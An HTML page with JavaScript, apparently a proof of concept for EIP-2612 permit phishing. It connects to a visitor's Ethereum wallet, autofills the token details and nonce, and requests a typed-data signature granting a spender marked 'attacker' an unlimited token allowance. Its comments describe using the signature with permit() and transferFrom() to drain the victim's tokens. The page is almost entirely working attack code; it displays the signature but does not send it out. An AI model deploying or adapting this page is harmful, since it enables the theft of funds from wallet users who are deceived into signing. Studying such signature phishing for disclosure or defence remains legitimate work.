<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>PoC — EIP-2612 Permit (Typed-Data Signature → Token Drain)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: system-ui, Arial, sans-serif; padding:20px; max-width:820px; margin:auto; }
    h1 { margin:0 0 10px; }
    label { display:block; margin-top:12px; font-weight:600; }
    input { width:100%; padding:10px; margin-top:6px; box-sizing:border-box; }
    .row { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
    button { margin-top:16px; padding:12px 16px; font-weight:700; cursor:pointer; }
    #status { margin-top:10px; font-weight:700; }
    pre { background:#f6f8fa; padding:12px; border-radius:8px; overflow:auto; white-space:pre-wrap; }
    .muted { opacity:.8; font-size:14px; }
  </style>
</head>
<body>
  <h1>EIP-2612 Permit Signature PoC (No Overlay)</h1>
  <p class="muted">This requests a typed-data signature for ERC-2612 <code>permit</code>. If the user signs, an attacker can submit <code>permit()</code> on-chain to set allowance, then <code>transferFrom()</code> to drain tokens.</p>

  <label>Token (ERC-2612) address</label>
  <input id="token" value="0x0000000000000000000000000000000000000000" />

  <div class="row">
    <div>
      <label>Token name (EIP-712 domain.name)</label>
      <input id="tokenName" placeholder="e.g., DAI" />
    </div>
    <div>
      <label>Token version (domain.version)</label>
      <input id="tokenVersion" value="1" />
    </div>
  </div>

  <div class="row">
    <div>
      <label>Spender (attacker)</label>
      <input id="spender" value="0xA11ceBEEF0000000000000000000000000000000" />
    </div>
    <div>
      <label>Value (allowance, uint256)</label>
      <input id="value" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" />
    </div>
  </div>

  <div class="row">
    <div>
      <label>Deadline (unix seconds)</label>
      <input id="deadline" />
    </div>
    <div>
      <label>Nonce (from token.nonces(owner))</label>
      <input id="nonce" placeholder="autofill on Connect" />
    </div>
  </div>

  <button id="connect">Connect & Prefill</button>
  <button id="sign">Request Permit Signature</button>

  <div id="status">Idle</div>
  <h3>Typed Data</h3>
  <pre id="typedData">(none)</pre>
  <h3>Signature</h3>
  <pre id="sig">(none)</pre>

  <p class="muted">
    Notes: Requires a wallet exposing <code>window.ethereum</code>. This PoC only requests a signature; in a real attack, the attacker would submit
    <code>permit()</code> with the signature (v,r,s) on-chain, then call <code>transferFrom()</code> to move tokens.
  </p>

<script>
  const $ = id => document.getElementById(id);
  const bnToHex = (bn) => '0x' + BigInt(bn).toString(16);
  const padLeft32 = (hex) => '0x' + hex.replace(/^0x/,'').padStart(64,'0');

  const ABI_NONCES = '0x7ecebe00';    // keccak256("nonces(address)")[0:4]
  const ABI_NAME   = '0x06fdde03';    // keccak256("name()")[0:4]
  const ABI_VER    = '0x54fd4d50';    // keccak256("version()")[0:4] (if present)

  let owner, chainIdHex, chainId, domainCache = {};

  async function ethCall(to, data) {
    return await ethereum.request({ method: 'eth_call', params: [{ to, data }, 'latest'] });
  }

  function hexToAscii(hex) {
    try {
      const clean = hex.replace(/^0x/,'');
      let out = '';
      for (let i = 0; i < clean.length; i += 2) {
        const code = parseInt(clean.slice(i, i+2), 16);
        if (code) out += String.fromCharCode(code);
      }
      return out;
    } catch { return ''; }
  }

  async function connect() {
    if (!window.ethereum) { $('status').textContent = 'No wallet provider.'; return; }
    const [acc] = await ethereum.request({ method:'eth_requestAccounts' });
    owner = acc;
    chainIdHex = await ethereum.request({ method:'eth_chainId' });
    chainId = parseInt(chainIdHex, 16);

    if (!$('deadline').value) $('deadline').value = Math.floor(Date.now()/1000) + 3600; // +1h
    $('status').textContent = `Connected: ${owner} @ chainId ${chainId}`;

    // Try to fetch name(), version(), nonces(owner)
    const token = $('token').value.trim();
    try {
      const nameHex = await ethCall(token, ABI_NAME);
      const name = hexToAscii(nameHex);
      if (name && !$('tokenName').value) $('tokenName').value = name;

      try {
        const verHex = await ethCall(token, ABI_VER);
        const ver = hexToAscii(verHex);
        if (ver && !$('tokenVersion').value) $('tokenVersion').value = ver;
      } catch {}

      // nonces(owner)
      const addrPadded = padLeft32(owner);
      const nonceHex = await ethCall(token, ABI_NONCES + addrPadded.slice(2));
      const nonce = parseInt(nonceHex, 16);
      if (!Number.isNaN(nonce)) $('nonce').value = String(nonce);
    } catch (e) {
      // Fallback: user can fill fields manually
    }
  }

  function buildTypedData() {
    const token     = $('token').value.trim();
    const name      = $('tokenName').value.trim() || 'Token';
    const version   = $('tokenVersion').value.trim() || '1';
    const spender   = $('spender').value.trim();
    const valueStr  = $('value').value.trim();
    const deadline  = Number($('deadline').value || 0);
    const nonce     = Number($('nonce').value || 0);

    const typedData = {
      types: {
        EIP712Domain: [
          { name:'name', type:'string' },
          { name:'version', type:'string' },
          { name:'chainId', type:'uint256' },
          { name:'verifyingContract', type:'address' },
        ],
        Permit: [
          { name:'owner', type:'address' },
          { name:'spender', type:'address' },
          { name:'value', type:'uint256' },
          { name:'nonce', type:'uint256' },
          { name:'deadline', type:'uint256' },
        ]
      },
      primaryType: 'Permit',
      domain: {
        name, version, chainId, verifyingContract: token
      },
      message: {
        owner, spender, value: valueStr, nonce, deadline
      }
    };
    return typedData;
  }

  async function signPermit() {
    if (!owner) { $('status').textContent = 'Connect first.'; return; }
    const typed = buildTypedData();
    $('typedData').textContent = JSON.stringify(typed, null, 2);

    try {
      $('status').textContent = 'Requesting EIP-712 signature…';
      const sig = await ethereum.request({
        method: 'eth_signTypedData_v4',
        params: [owner, JSON.stringify(typed)]
      });
      $('status').textContent = 'Signature obtained.';
      $('sig').textContent = sig;

      // In real attack: send (v,r,s) via permit() on-chain, then transferFrom().
    } catch (e) {
      $('status').textContent = 'Signature denied/failed.';
      $('sig').textContent = String(e && e.message || e);
    }
  }

  $('connect').addEventListener('click', connect);
  $('sign').addEventListener('click', signPermit);
</script>
</body>
</html>
